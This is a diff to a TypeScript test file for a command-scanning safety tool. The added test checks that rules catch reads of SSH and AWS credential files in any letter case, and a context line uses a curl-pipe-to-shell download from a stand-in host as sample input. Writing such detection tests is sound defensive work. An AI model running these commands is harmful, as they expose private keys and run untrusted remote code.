@@ -56,6 +56,13 @@ describe("the built-in rules", () => {
     expect(report.counts.HIGH).toBeGreaterThanOrEqual(2);
   });
 
+  it("finds credential files whatever their letter case, as macOS and Windows disks do", () => {
+    const line = (text: string): string[] =>
+      SAFETY_RULES.filter((rule) => rule.regex.test(text)).map((rule) => rule.id);
+    expect(line("cat ~/.SSH/id_rsa")).toContain("credentials.ssh");
+    expect(line("cat ~/.AWS/Credentials")).toContain("credentials.cloud");
+  });
+
   it("reads a script with no extension as code, like the same script named setup.sh", () => {
     const pipe = "curl -s https://collector.example.com/x.sh | sh\n";
     const named = scanWithRules(
